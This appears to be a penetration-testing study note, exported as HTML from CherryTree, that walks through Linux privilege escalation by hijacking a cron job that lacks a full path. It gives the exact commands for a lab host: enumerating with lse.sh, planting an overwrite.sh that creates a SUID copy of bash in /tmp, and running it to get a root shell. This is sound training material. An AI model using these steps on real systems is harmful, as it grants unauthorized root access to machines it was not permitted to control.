<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Missing full path in the cronjob</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Missing full path in the cronjob</h1><br/><br />• The crontab PATH environment variable is by default set to:<br />   ◇ /usr/bin:/bin<br />• The PATH variable can be overwritten in the crontab file.<br />• If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job<br />0.  <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>lse.sh -l 1 -i <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">more</span></pre></div><br />    <a href=""><img src="images/1303-1.png" alt="images/1303-1.png" /></a><br />1. View the <span style="color:#1e90ff;">cronJobs</span> of the system-wide crontab:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>crontab</pre></div><br />    <a href=""><img src="images/1303-2.png" alt="images/1303-2.png" /></a><br />   ◇ <span style="color:#1e90ff;">CronJobs</span>:<br />      ▪ overwrite.sh<br />         - Note that it does not use an absolute path<br />         - <span style="color:#a020f0;">/home/user</span> directory (which we can write to) is at the start of the PATH variable<br />      ▪ /usr/local/bin/compress.sh<br />2. Create the file <span style="color:#1e90ff;">overwrite.sh</span> in <span style="color:#a020f0;">/home/user</span> with the following contents:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ vim <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>overwrite.sh</pre></div><br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br /><br /><span style="color:#ff9d00;font-weight:700">cp</span> <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootbash<br /><span style="color:#ff9d00;font-weight:700">chmod</span> +s <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootbash</pre></div><br />3. Ensure that overwrite.sh is executable:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">chmod</span> +x <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>overwrite.sh</pre></div><br />4. Wait for the <span style="color:#1e90ff;">cronjob</span> to run and for the /tmp/rootbash file to be created<br />5.  execute /tmp/rootbash (with -p to preserve the effective UID) to gain a root shell<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootbash –p</pre></div><br />    <a href=""><img src="images/1303-3.png" alt="images/1303-3.png" /></a><br /></div>
</body>
</html>
